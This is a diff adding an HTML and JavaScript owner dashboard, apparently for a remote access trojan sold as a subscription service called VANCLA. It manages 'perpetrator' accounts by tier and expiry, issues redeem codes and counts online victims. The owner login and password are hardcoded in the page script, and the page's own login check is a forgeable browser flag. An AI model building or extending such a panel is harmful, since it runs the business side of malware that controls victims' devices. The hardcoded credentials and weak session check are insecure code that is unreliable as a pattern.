@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VANCLA OWNER - Dashboard</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#02060f;--bg2:#060d1a;--bg3:#0a1220;--glass:rgba(255,255,255,.04);--gb:rgba(255,255,255,.08);--acc:#f59e0b;--acc2:#d97706;--glow:rgba(245,158,11,.2);--green:#10b981;--red:#ef4444;--blue:#0ea5e9;--text:#e2e8f0;--t2:#64748b}
+body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh}
+body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 30% 20%,rgba(245,158,11,.05),transparent 60%);pointer-events:none}
+
+/* DASH */
+#pg-dash{min-height:100vh}
+
+/* SIDEBAR */
+#sb{
+  position:fixed;
+  top:0;
+  left:0;
+  bottom:0;
+  width:260px;
+  background:var(--bg2);
+  border-right:1px solid rgba(245,158,11,.1);
+  padding:20px 0;
+  z-index:100;
+  display:flex;
+  flex-direction:column;
+  transition:transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+}
+#sb.collapsed{
+  transform:translateX(-260px);
+}
+#main{
+  margin-left:260px;
+  padding:28px 24px;
+  transition:margin-left 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+}
+/* Toggle button */
+#toggleSb{
+  position:fixed;
+  left:270px;
+  top:20px;
+  width:36px;
+  height:36px;
+  background:var(--bg3);
+  border:1px solid var(--gb);
+  border-radius:10px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  cursor:pointer;
+  z-index:101;
+  transition:all 0.3s;
+  color:var(--acc);
+  font-size:16px;
+}
+#toggleSb:hover{
+  background:rgba(245,158,11,.15);
+  border-color:var(--acc);
+}
+#toggleSb.collapsed{
+  left:20px;
+}
+
+.sb-logo{padding:0 18px 20px;border-bottom:1px solid rgba(255,255,255,.06);margin-bottom:14px}
+.sb-logo-t{font-family:'Orbitron',monospace;font-size:15px;font-weight:900;color:var(--acc);letter-spacing:3px}
+.sb-logo-s{font-size:9px;color:var(--t2);letter-spacing:2px;margin-top:2px;font-family:'JetBrains Mono',monospace}
+.sb-item{
+  display:flex;
+  align-items:center;
+  gap:11px;
+  padding:11px 18px;
+  cursor:pointer;
+  color:var(--t2);
+  font-size:13px;
+  font-weight:500;
+  border-left:3px solid transparent;
+  transition:all .2s;
+  white-space:nowrap;
+}
+.sb-item:hover{
+  background:rgba(245,158,11,.04);
+  color:var(--text);
+}
+.sb-item.active{
+  color:var(--acc);
+  background:rgba(245,158,11,.07);
+  border-left-color:var(--acc);
+}
+.sb-item i{
+  width:20px;
+  text-align:center;
+  font-size:14px;
+}
+.sb-bottom{margin-top:auto}
+
+/* MAIN CONTENT */
+.ptitle{
+  font-family:'Orbitron',monospace;
+  font-size:16px;
+  font-weight:900;
+  color:var(--text);
+  margin-bottom:20px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  flex-wrap:wrap;
+  gap:12px;
+}
+.ptitle span{
+  display:flex;
+  align-items:center;
+  gap:8px;
+}
+
+/* STATS */
+.sg{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:24px}
+.sc{background:var(--glass);border:1px solid var(--gb);border-radius:14px;padding:16px;backdrop-filter:blur(10px)}
+.sic{width:34px;height:34px;border-radius:9px;background:rgba(245,158,11,.1);display:flex;align-items:center;justify-content:center;font-size:14px;color:var(--acc);margin-bottom:10px}
+.sv{font-family:'Orbitron',monospace;font-size:22px;font-weight:700;color:var(--text)}
+.sl{font-size:9px;color:var(--t2);letter-spacing:1px;text-transform:uppercase;font-family:'JetBrains Mono',monospace;margin-top:2px}
+
+/* CARD */
+.card{background:var(--glass);border:1px solid var(--gb);border-radius:14px;padding:20px;margin-bottom:16px;backdrop-filter:blur(10px)}
+.card-title{font-size:12px;font-weight:600;color:var(--t2);letter-spacing:1.5px;margin-bottom:16px;display:flex;align-items:center;gap:8px;font-family:'JetBrains Mono',monospace;text-transform:uppercase}
+.card-title i{color:var(--acc)}
+
+/* TABLE */
+.tw{overflow-x:auto}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{text-align:left;padding:8px 12px;color:var(--t2);font-size:10px;letter-spacing:1px;text-transform:uppercase;font-family:'JetBrains Mono',monospace;border-bottom:1px solid var(--gb)}
+td{padding:10px 12px;border-bottom:1px solid rgba(255,255,255,.04);vertical-align:middle}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:rgba(255,255,255,.02)}
+
+/* BADGES */
+.rb{display:inline-block;padding:2px 8px;border-radius:20px;font-size:10px;font-weight:700;letter-spacing:.5px;font-family:'JetBrains Mono',monospace}
+.rb-basic{background:rgba(100,116,139,.15);color:#94a3b8;border:1px solid rgba(100,116,139,.3)}
+.rb-pro{background:rgba(14,165,233,.1);color:#0ea5e9;border:1px solid rgba(14,165,233,.25)}
+.rb-premium{background:rgba(139,92,246,.1);color:#a78bfa;border:1px solid rgba(139,92,246,.25)}
+.rb-vip{background:rgba(245,158,11,.1);color:#fbbf24;border:1px solid rgba(245,158,11,.25)}
+.rb-vvip{background:rgba(244,63,94,.1);color:#f43f5e;border:1px solid rgba(244,63,94,.25)}
+
+/* BUTTONS */
+.btn{display:inline-flex;align-items:center;justify-content:center;gap:6px;padding:9px 16px;border-radius:9px;border:none;font-family:'Inter',sans-serif;font-size:12px;font-weight:600;cursor:pointer;transition:all .2s}
+.btn:active{transform:scale(.95)}
+.btn-sm{padding:6px 11px;font-size:11px}
+.bgold{background:linear-gradient(135deg,var(--acc),var(--acc2));color:#02060f}
+.bblue{background:linear-gradient(135deg,#0284c7,#0ea5e9);color:white}
+.bgreen{background:linear-gradient(135deg,#059669,#10b981);color:white}
+.bred{background:linear-gradient(135deg,#dc2626,#ef4444);color:white}
+.bghost{background:rgba(255,255,255,.05);border:1px solid var(--gb);color:var(--t2)}
+
+/* MODAL */
+#mdbg{position:fixed;inset:0;background:rgba(2,6,15,.88);backdrop-filter:blur(8px);display:none;align-items:center;justify-content:center;z-index:500;padding:20px}
+#mdbg.show{display:flex}
+.mdbox{background:var(--bg3);border:1px solid var(--gb);border-radius:16px;padding:28px;width:100%;max-width:400px;animation:pi .3s cubic-bezier(.175,.885,.32,1.275)}
+@keyframes pi{from{transform:scale(.85);opacity:0}to{transform:scale(1);opacity:1}}
+.mdtitle{font-size:15px;font-weight:700;color:var(--text);margin-bottom:20px;display:flex;align-items:center;gap:8px}
+.mdtitle i{color:var(--acc)}
+.flbl{font-size:10px;color:var(--t2);letter-spacing:1px;text-transform:uppercase;font-family:'JetBrains Mono',monospace;margin-bottom:5px}
+.mdbtns{display:flex;gap:10px;margin-top:20px;justify-content:flex-end}
+select.inp{cursor:pointer;background:var(--bg2)}
+.inp{width:100%;background:rgba(255,255,255,.04);border:1px solid rgba(245,158,11,.2);border-radius:10px;padding:12px 14px;color:var(--text);font-family:'Inter',sans-serif;font-size:14px;outline:none;transition:all .2s;margin-bottom:12px}
+.inp:focus{border-color:rgba(245,158,11,.5);box-shadow:0 0 0 3px rgba(245,158,11,.07)}
+.inp::placeholder{color:var(--t2)}
+
+/* STATUS DOTS */
+.don{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green);animation:bl 2s ease-in-out infinite;vertical-align:middle;margin-right:4px}
+@keyframes bl{0%,100%{opacity:1}50%{opacity:.4}}
+
+/* TOAST */
+#toast{position:fixed;bottom:20px;right:20px;background:var(--bg3);border:1px solid var(--gb);border-radius:10px;padding:11px 16px;font-size:12px;color:var(--text);z-index:999;opacity:0;transition:all .3s;transform:translateY(8px);pointer-events:none;font-family:'JetBrains Mono',monospace;max-width:300px}
+#toast.show{opacity:1;transform:none}
+#toast.ok{border-color:rgba(16,185,129,.4);color:var(--green)}
+#toast.err{border-color:rgba(239,68,68,.4);color:var(--red)}
+.tab{display:none}.tab.on{display:block}
+
+/* ROLE DIST */
+.rdist{display:flex;flex-wrap:wrap;gap:12px;padding:8px 0}
+.rdcard{text-align:center;padding:12px 18px;background:rgba(255,255,255,.03);border:1px solid var(--gb);border-radius:10px;min-width:90px}
+.rdval{font-family:'Orbitron',monospace;font-size:20px;font-weight:700;color:var(--text)}
+
+/* RESPONSIVE */
+@media (max-width: 768px) {
+  .ptitle{flex-direction:column;align-items:flex-start}
+  .sg{grid-template-columns:repeat(2,1fr)}
+  .rdist{justify-content:center}
+  .mdbox{width:calc(100% - 40px);margin:20px}
+  #main{margin-left:0}
+  #sb{transform:translateX(-260px)}
+  #sb:not(.collapsed){transform:translateX(0)}
+  #toggleSb{left:20px}
+}
+
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:rgba(245,158,11,.2);border-radius:2px}
+</style>
+</head>
+<body>
+<div id="toast"></div>
+
+<div id="pg-dash">
+  <!-- Toggle Button -->
+  <div id="toggleSb" onclick="toggleSidebar()">
+    <i class="fa-solid fa-bars"></i>
+  </div>
+
+  <!-- Sidebar -->
+  <div id="sb">
+    <div class="sb-logo">
+      <div class="sb-logo-t">VANCLA</div>
+      <div class="sb-logo-s">OWNER PANEL</div>
+    </div>
+    <div class="sb-item active" data-tab="overview" onclick="switchTab('overview',this)"><i class="fa-solid fa-gauge-high"></i> Overview</div>
+    <div class="sb-item" data-tab="attackers" onclick="switchTab('attackers',this)"><i class="fa-solid fa-users"></i> Akun Pelaku</div>
+    <div class="sb-item" data-tab="redeem" onclick="switchTab('redeem',this)"><i class="fa-solid fa-ticket"></i> Redeem Code</div>
+    <div class="sb-bottom">
+      <div class="sb-item" onclick="doLogout()" style="color:var(--red)"><i class="fa-solid fa-right-from-bracket"></i> Logout</div>
+    </div>
+  </div>
+
+  <!-- Main Content -->
+  <div id="main">
+    <!-- OVERVIEW -->
+    <div class="tab on" id="tab-overview">
+      <div class="ptitle">
+        <span><i class="fa-solid fa-gauge-high" style="color:var(--acc)"></i> Overview Dashboard</span>
+      </div>
+      <div class="sg">
+        <div class="sc"><div class="sic"><i class="fa-solid fa-users"></i></div><div class="sv" id="st-tot">0</div><div class="sl">Total Akun</div></div>
+        <div class="sc"><div class="sic" style="background:rgba(14,165,233,.1)"><i class="fa-solid fa-circle-dot" style="color:#0ea5e9"></i></div><div class="sv" id="st-atk">0</div><div class="sl">Pelaku Online</div></div>
+        <div class="sc"><div class="sic" style="background:rgba(16,185,129,.1)"><i class="fa-solid fa-mobile-screen" style="color:var(--green)"></i></div><div class="sv" id="st-vic">0</div><div class="sl">Korban Online</div></div>
+        <div class="sc"><div class="sic" style="background:rgba(139,92,246,.1)"><i class="fa-solid fa-ticket" style="color:#a78bfa"></i></div><div class="sv" id="st-red">0</div><div class="sl">Redeem Code</div></div>
+      </div>
+      <div class="card">
+        <div class="card-title"><i class="fa-solid fa-chart-pie"></i>Distribusi Role</div>
+        <div class="rdist" id="rdist"></div>
+      </div>
+    </div>
+
+    <!-- ATTACKERS -->
+    <div class="tab" id="tab-attackers">
+      <div class="ptitle">
+        <span><i class="fa-solid fa-users" style="color:var(--acc)"></i> Manajemen Akun Pelaku</span>
+        <button class="btn bgold btn-sm" onclick="openModal('create')"><i class="fa-solid fa-plus"></i> Buat Akun</button>
+      </div>
+      <div class="card">
+        <div class="tw">
+          <table>
+            <thead>
+              <tr><th>Username</th><th>Role</th><th>Status</th><th>Expire</th><th>Aksi</th></tr>
+            </thead>
+            <tbody id="atk-tb"></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- REDEEM -->
+    <div class="tab" id="tab-redeem">
+      <div class="ptitle">
+        <span><i class="fa-solid fa-ticket" style="color:var(--acc)"></i> Manajemen Redeem Code</span>
+        <button class="btn bgold btn-sm" onclick="openModal('redeem')"><i class="fa-solid fa-plus"></i> Buat Kode</button>
+      </div>
+      <div class="card">
+        <div class="tw">
+          <table>
+            <thead>
+              <tr><th>Code</th><th>Tipe</th><th>Value</th><th>Pakai</th><th>Aksi</th></tr>
+            </thead>
+            <tbody id="red-tb"></tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- MODAL -->
+<div id="mdbg">
+  <div class="mdbox" id="mdbox"></div>
+</div>
+
+<script>
+const API = '';
+let token = null;
+let atkList = [], redList = [], editId = null;
+let toastT;
+
+// Cek session login
+if (!sessionStorage.getItem('vtok') || sessionStorage.getItem('vtok') !== '1') {
+  window.location.href = '/login.html';
+}
+
+// ── SIDEBAR TOGGLE ─────────────────────────────────
+function toggleSidebar() {
+  const sidebar = document.getElementById('sb');
+  const toggleBtn = document.getElementById('toggleSb');
+  const main = document.getElementById('main');
+  sidebar.classList.toggle('collapsed');
+  toggleBtn.classList.toggle('collapsed');
+  
+  // Simpan state ke localStorage
+  const isCollapsed = sidebar.classList.contains('collapsed');
+  localStorage.setItem('sidebarCollapsed', isCollapsed);
+  
+  // Adjust main margin
+  if (isCollapsed) {
+    main.style.marginLeft = '0';
+  } else {
+    main.style.marginLeft = '260px';
+  }
+}
+
+// Load sidebar state dari localStorage
+function loadSidebarState() {
+  const isCollapsed = localStorage.getItem('sidebarCollapsed') === 'true';
+  const sidebar = document.getElementById('sb');
+  const toggleBtn = document.getElementById('toggleSb');
+  const main = document.getElementById('main');
+  
+  if (isCollapsed) {
+    sidebar.classList.add('collapsed');
+    toggleBtn.classList.add('collapsed');
+    main.style.marginLeft = '0';
+  } else {
+    main.style.marginLeft = '260px';
+  }
+}
+
+// ── HELPER FUNCTIONS ─────────────────────────────────
+function g(id){return document.getElementById(id);}
+function $(id,v){const e=g(id);if(e)e.textContent=v;}
+function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+function toast(msg,type=''){const t=g('toast');t.textContent=msg;t.className='show'+(type?' '+type:'');clearTimeout(toastT);toastT=setTimeout(()=>{t.className='';},3000);}
+
+// ── HTTP ──────────────────────────────────────────────
+async function get(path){const r=await fetch(API+path,{headers:{Authorization:'Bearer '+token}});return r.json();}
+async function post(path,body,useToken=true){const h={'Content-Type':'application/json'};if(useToken&&token)h.Authorization='Bearer '+token;const r=await fetch(API+path,{method:'POST',headers:h,body:JSON.stringify(body)});return r.json();}
+async function put(path,body){const r=await fetch(API+path,{method:'PUT',headers:{'Content-Type':'application/json',Authorization:'Bearer '+token},body:JSON.stringify(body)});return r.json();}
+async function del(path){const r=await fetch(API+path,{method:'DELETE',headers:{Authorization:'Bearer '+token}});return r.json();}
+
+// ── AUTH ──────────────────────────────────────────
+async function getToken() {
+  try {
+    const r = await fetch(API+'/api/owner/login', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({username: 'VANCLAOWN', password: 'VANCLARAT2K26'})
+    });
+    const data = await r.json();
+    if (data.success) {
+      token = data.token;
+      return true;
+    }
+    return false;
+  } catch(e) {
+    toast('Gagal koneksi ke server: ' + e.message, 'err');
+    return false;
+  }
+}
+
+function doLogout() {
+  try { 
+    sessionStorage.removeItem('vtok'); 
+    localStorage.removeItem('sidebarCollapsed');
+    window.location.href = '/login.html';
+  } catch(e) {}
+}
+
+// ── TABS ──────────────────────────────────────────
+function switchTab(name, el) {
+  document.querySelectorAll('.tab').forEach(t=>t.classList.remove('on'));
+  document.querySelectorAll('.sb-item').forEach(s=>s.classList.remove('active'));
+  const targetTab = g('tab-'+name);
+  if(targetTab) targetTab.classList.add('on'); 
+  if(el) el.classList.add('active');
+  
+  if(name==='attackers') loadAttackers();
+  if(name==='redeem')    loadRedeem();
+  if(name==='overview')  loadStats();
+}
+
+async function loadAll(){
+  if (!token) {
+    const ok = await getToken();
+    if (!ok) { 
+      toast('Gagal login ke server', 'err'); 
+      return;
+    }
+  }
+  await loadStats();
+  await loadAttackers();
+  await loadRedeem();
+  
+  // Auto refresh every 30 seconds
+  setInterval(async () => {
+    const activeTab = document.querySelector('.tab.on')?.id;
+    if(activeTab === 'tab-overview') await loadStats();
+    if(activeTab === 'tab-attackers') await loadAttackers();
+    if(activeTab === 'tab-redeem') await loadRedeem();
+  }, 30000);
+}
+
+// ── STATS ──────────────────────────────────────────
+async function loadStats(){
+  try {
+    const r = await get('/api/owner/stats');
+    if(!r.success) return;
+    $('st-tot', r.total_attackers || 0); 
+    $('st-atk', r.online_attackers || 0);
+    $('st-vic', r.online_victims || 0);  
+    $('st-red', r.total_redeem || 0);
+    const counts = r.role_counts || {};
+    const roles = ['basic','pro','premium','vip','vvip'];
+    const roleNames = {
+      basic: 'BASIC', pro: 'PRO', premium: 'PREMIUM', vip: 'VIP', vvip: 'VVIP'
+    };
+    g('rdist').innerHTML = roles.map(role => `
+      <div class="rdcard">
+        <div class="rdval">${counts[role] || 0}</div>
+        <span class="rb rb-${role}">${roleNames[role]}</span>
+      </div>
+    `).join('');
+  } catch(e){
+    console.error('Load stats error:', e);
+  }
+}
+
+// ── ATTACKERS ──────────────────────────────────────
+async function loadAttackers(){
+  try {
+    const r = await get('/api/owner/attackers');
+    if(!r.success) return;
+    atkList = r.attackers || [];
+    renderAtk();
+  } catch(e){
+    console.error('Load attackers error:', e);
+  }
+}
+
+function renderAtk(){
+  const tb=g('atk-tb');
+  if(!tb) return;
+  if(!atkList.length){
+    tb.innerHTML='<tr><td colspan="5" style="text-align:center;color:var(--t2);padding:20px">Belum ada akun pelaku</td></tr>';
+    return;
+  }
+  tb.innerHTML=atkList.map(a=>`
+    <tr>
+      <td style="font-weight:500">${esc(a.username)} ${a.online?'<span class="don"></span>':''}</td>
+      <td><span class="rb rb-${a.role}">${(a.role||'basic').toUpperCase()}</span></td>
+      <td>${a.banned?'<span style="color:var(--red);font-size:11px"><i class="fa-solid fa-ban"></i> BANNED</span>':'<span style="color:var(--green);font-size:11px"><i class="fa-solid fa-check"></i> Aktif</span>'}</td>
+      <td style="font-family:\'JetBrains Mono\',monospace;font-size:11px;color:var(--t2)">${a.expires_at ? new Date(a.expires_at).toLocaleDateString('id') : '-'}</td>
+      <td><div style="display:flex;gap:5px;flex-wrap:wrap">
+        <button onclick="openModal(\'upgrade\',\''+a.id+'\')" class="btn btn-sm" style="background:rgba(139,92,246,.15);color:#a78bfa" title="Upgrade Role"><i class="fa-solid fa-arrow-up"></i></button>
+        <button onclick="openModal(\'extend\',\''+a.id+'\')"  class="btn btn-sm" style="background:rgba(16,185,129,.15);color:var(--green)" title="Tambah Durasi"><i class="fa-solid fa-clock"></i></button>
+        <button onclick="openModal(\'pass\',\''+a.id+'\')"    class="btn btn-sm" style="background:rgba(14,165,233,.15);color:#0ea5e9" title="Reset Password"><i class="fa-solid fa-key"></i></button>
+        <button onclick="toggleBan(\''+a.id+'\','+(!a.banned)+')" class="btn btn-sm" style="background:${a.banned?'rgba(16,185,129,.15)':'rgba(239,68,68,.15)'};color:${a.banned?'var(--green)':'var(--red)'}" title="${a.banned?'Unban':'Ban'}"><i class="fa-solid fa-${a.banned?'unlock':'ban'}"></i></button>
+        <button onclick="delAtk(\''+a.id+'\')" class="btn btn-sm" style="background:rgba(239,68,68,.1);color:var(--red)" title="Hapus"><i class="fa-solid fa-trash"></i></button>
+      </div></td>
+    </tr>
+  `).join('');
+}
+
+// ── REDEEM ──────────────────────────────────────────
+async function loadRedeem(){
+  try {
+    const r = await get('/api/owner/redeem');
+    if(!r.success) return;
+    redList = r.codes || [];
+    renderRed();
+  } catch(e){
+    console.error('Load redeem error:', e);
+  }
+}
+
+function renderRed(){
+  const tb=g('red-tb');
+  if(!tb) return;
+  if(!redList.length){
+    tb.innerHTML='<tr><td colspan="5" style="text-align:center;color:var(--t2);padding:20px">Belum ada redeem code</td></tr>';
+    return;
+  }
+  tb.innerHTML=redList.map(c=>`
+    <tr>
+      <td style="font-family:\'JetBrains Mono\',monospace;font-weight:600;color:var(--acc);letter-spacing:2px">${esc(c.code)}</td>
+      <td style="font-size:12px">${c.type==='duration'?'<i class="fa-solid fa-clock" style="color:var(--blue)"></i> Durasi':'<i class="fa-solid fa-arrow-up" style="color:#a78bfa"></i> Upgrade'}</td>
+      <td style="font-size:12px;color:var(--t2)">${c.type==='duration'?'+'+c.days+' hari':'→ '+((c.target_role||'—').toUpperCase())}</td>
+      <td style="font-family:\'JetBrains Mono\',monospace;font-size:11px">${c.used_count||0}/${c.max_uses||0} <span style="color:${c.active?'var(--green)':'var(--t2)'};font-size:10px">${c.active?'AKTIF':'HABIS'}</span></td>
+      <td><button onclick="delRedeem(\''+c.id+'\')" class="btn btn-sm" style="background:rgba(239,68,68,.1);color:var(--red)" title="Hapus Kode"><i class="fa-solid fa-trash"></i></button></td>
+    </tr>
+  `).join('');
+}
+
+// ── MODALS ──────────────────────────────────────────
+function openModal(type, id) {
+  editId = id || null;
+  const box = g('mdbox');
+  if(!box) return;
+  let h = '';
+  if(type==='create'){
+    h=`<div class="mdtitle"><i class="fa-solid fa-user-plus"></i>Buat Akun Pelaku</div>
+    <div class="flbl">Username</div><input class="inp" id="m-u" placeholder="username" autocomplete="off">
+    <div class="flbl">Password</div><input class="inp" id="m-p" type="password" placeholder="password">
+    <div class="flbl">Role</div><select class="inp" id="m-r"><option value="basic">Basic</option><option value="pro">Pro</option><option value="premium">Premium</option><option value="vip">VIP</option><option value="vvip">VVIP</option></select>
+    <div class="flbl">Durasi (hari)</div><input class="inp" id="m-d" type="number" value="30" min="1">
+    <div class="mdbtns"><button class="btn bghost btn-sm" onclick="closeModal()">Batal</button><button class="btn bgold btn-sm" onclick="createAtk()"><i class="fa-solid fa-check"></i> Buat</button></div>`;
+  } else if(type==='upgrade'){
+    const a=atkList.find(x=>x.id===id);
+    h=`<div class="mdtitle"><i class="fa-solid fa-arrow-up"></i>Upgrade Role — ${esc(a?.username||'')}</div>
+    <div class="flbl">Role Baru</div><select class="inp" id="m-r"><option value="basic">Basic</option><option value="pro">Pro</option><option value="premium">Premium</option><option value="vip">VIP</option><option value="vvip">VVIP</option></select>
+    <div class="mdbtns"><button class="btn bghost btn-sm" onclick="closeModal()">Batal</button><button class="btn bgold btn-sm" onclick="upgradeRole()"><i class="fa-solid fa-arrow-up"></i> Upgrade</button></div>`;
+  } else if(type==='extend'){
+    h=`<div class="mdtitle"><i class="fa-solid fa-clock"></i>Tambah Durasi</div>
+    <div class="flbl">Tambah (hari)</div><input class="inp" id="m-d" type="number" value="30" min="1">
+    <div class="mdbtns"><button class="btn bghost btn-sm" onclick="closeModal()">Batal</button><button class="btn bgreen btn-sm" onclick="extendDur()"><i class="fa-solid fa-plus"></i> Tambah</button></div>`;
+  } else if(type==='pass'){
+    h=`<div class="mdtitle"><i class="fa-solid fa-key"></i>Reset Password</div>
+    <div class="flbl">Password Baru</div><input class="inp" id="m-p" type="password" placeholder="password baru">
+    <div class="mdbtns"><button class="btn bghost btn-sm" onclick="closeModal()">Batal</button><button class="btn bblue btn-sm" onclick="resetPw()"><i class="fa-solid fa-check"></i> Simpan</button></div>`;
+  } else if(type==='redeem'){
+    h=`<div class="mdtitle"><i class="fa-solid fa-ticket"></i>Buat Redeem Code</div>
+    <div class="flbl">Tipe</div><select class="inp" id="m-t" onchange="rTypeChange()"><option value="duration">Tambah Durasi</option><option value="upgrade">Upgrade Role</option></select>
+    <div id="m-dur-g"><div class="flbl">Jumlah Hari</div><input class="inp" id="m-d" type="number" value="30" min="1"></div>
+    <div id="m-role-g" style="display:none"><div class="flbl">Target Role</div><select class="inp" id="m-r"><option value="pro">Pro</option><option value="premium">Premium</option><option value="vip">VIP</option><option value="vvip">VVIP</option></select></div>
+    <div class="flbl">Maks Penggunaan</div><input class="inp" id="m-mx" type="number" value="1" min="1">
+    <div class="flbl">Kode Custom (opsional)</div><input class="inp" id="m-c" placeholder="Auto generate jika kosong" autocomplete="off">
+    <div class="mdbtns"><button class="btn bghost btn-sm" onclick="closeModal()">Batal</button><button class="btn bgold btn-sm" onclick="createRedeem()"><i class="fa-solid fa-ticket"></i> Buat</button></div>`;
+  }
+  box.innerHTML = h;
+  g('mdbg').classList.add('show');
+  
+  // Re-attach event handlers for dynamic elements
+  if(type==='redeem'){
+    const typeSelect = document.getElementById('m-t');
+    if(typeSelect) typeSelect.onchange = rTypeChange;
+  }
+}
+
+function closeModal(){
+  const modal = g('mdbg');
+  if(modal) modal.classList.remove('show');
+  editId = null;
+}
+
+// Close modal when clicking outside
+if(g('mdbg')) {
+  g('mdbg').addEventListener('click', e => {
+    if(e.target === g('mdbg')) closeModal();
+  });
+}
+
+function rTypeChange(){
+  const t = g('m-t');
+  const durDiv = g('m-dur-g');
+  const roleDiv = g('m-role-g');
+  if(t && durDiv && roleDiv) {
+    durDiv.style.display = t.value === 'duration' ? '' : 'none';
+    roleDiv.style.display = t.value === 'upgrade' ? '' : 'none';
+  }
+}
+
+// ── ACTIONS ──────────────────────────────────────────
+async function createAtk(){
+  const u = g('m-u')?.value.trim();
+  const p = g('m-p')?.value.trim();
+  const role = g('m-r')?.value;
+  const days = parseInt(g('m-d')?.value) || 30;
+  if(!u || !p){toast('Lengkapi semua field','err');return;}
+  
+  const r = await post('/api/owner/attackers', {username: u, password: p, role, days});
+  if(r.success){
+    toast('Akun berhasil dibuat!', 'ok');
+    closeModal();
+    await loadAttackers();
+    await loadStats();
+  } else {
+    toast(r.message || 'Gagal membuat akun', 'err');
+  }
+}
+
+async function upgradeRole(){
+  const role = g('m-r')?.value;
+  if(!role) return;
+  const r = await put(`/api/owner/attackers/${editId}/role`, {role});
+  if(r.success){
+    toast(r.message || 'Role berhasil diupgrade!', 'ok');
+    closeModal();
+    await loadAttackers();
+  } else {
+    toast(r.message || 'Gagal upgrade role', 'err');
+  }
+}
+
+async function extendDur(){
+  const days = parseInt(g('m-d')?.value) || 30;
+  const r = await put(`/api/owner/attackers/${editId}/extend`, {days});
+  if(r.success){
+    toast(`+${days} hari ditambahkan!`, 'ok');
+    closeModal();
+    await loadAttackers();
+  } else {
+    toast(r.message || 'Gagal tambah durasi', 'err');
+  }
+}
+
+async function resetPw(){
+  const p = g('m-p')?.value.trim();
+  if(!p){toast('Masukkan password baru','err');return;}
+  const r = await put(`/api/owner/attackers/${editId}/password`, {password: p});
+  if(r.success){
+    toast('Password berhasil direset!', 'ok');
+    closeModal();
+  } else {
+    toast(r.message || 'Gagal reset password', 'err');
+  }
+}
+
+async function toggleBan(id, ban){
+  const reason = ban ? prompt('Alasan ban (opsional):') : null;
+  if(ban && reason === null) return;
+  const r = await put(`/api/owner/attackers/${id}/ban`, {banned: ban, reason: reason || ''});
+  if(r.success){
+    toast(r.message, 'ok');
+    await loadAttackers();
+  } else {
+    toast(r.message || 'Gagal mengubah status ban', 'err');
+  }
+}
+
+async function delAtk(id){
+  if(!confirm('Hapus akun ini? Data tidak dapat dikembalikan!')) return;
+  const r = await del(`/api/owner/attackers/${id}`);
+  if(r.success){
+    toast('Akun berhasil dihapus', 'ok');
+    await loadAttackers();
+    await loadStats();
+  } else {
+    toast(r.message || 'Gagal menghapus akun', 'err');
+  }
+}
+
+async function createRedeem(){
+  const type = g('m-t')?.value;
+  const days = parseInt(g('m-d')?.value) || 30;
+  const target_role = g('m-r')?.value;
+  const max_uses = parseInt(g('m-mx')?.value) || 1;
+  const custom_code = g('m-c')?.value.trim() || undefined;
+  
+  const r = await post('/api/owner/redeem', {type, days, target_role, max_uses, custom_code});
+  if(r.success){
+    toast('Kode redeem: ' + r.code.code, 'ok');
+    closeModal();
+    await loadRedeem();
+    await loadStats();
+  } else {
+    toast(r.message || 'Gagal membuat kode redeem', 'err');
+  }
+}
+
+async function delRedeem(id){
+  if(!confirm('Hapus kode redeem ini?')) return;
+  const r = await del(`/api/owner/redeem/${id}`);
+  if(r.success){
+    toast('Kode redeem dihapus', 'ok');
+    await loadRedeem();
+    await loadStats();
+  } else {
+    toast('Gagal menghapus kode', 'err');
+  }
+}
+
+// Initialize
+loadSidebarState();
+loadAll();
+
+// Handle window resize for responsive sidebar
+window.addEventListener('resize', () => {
+  const isMobile = window.innerWidth <= 768;
+  const sidebar = document.getElementById('sb');
+  const main = document.getElementById('main');
+  if(isMobile) {
+    if(sidebar && !sidebar.classList.contains('collapsed')) {
+      main.style.marginLeft = '0';
+    }
+  } else {
+    if(sidebar && !sidebar.classList.contains('collapsed')) {
+      main.style.marginLeft = '260px';
+    } else if(sidebar && sidebar.classList.contains('collapsed')) {
+      main.style.marginLeft = '0';
+    }
+  }
+});
+</script>
+</body>
+</html>
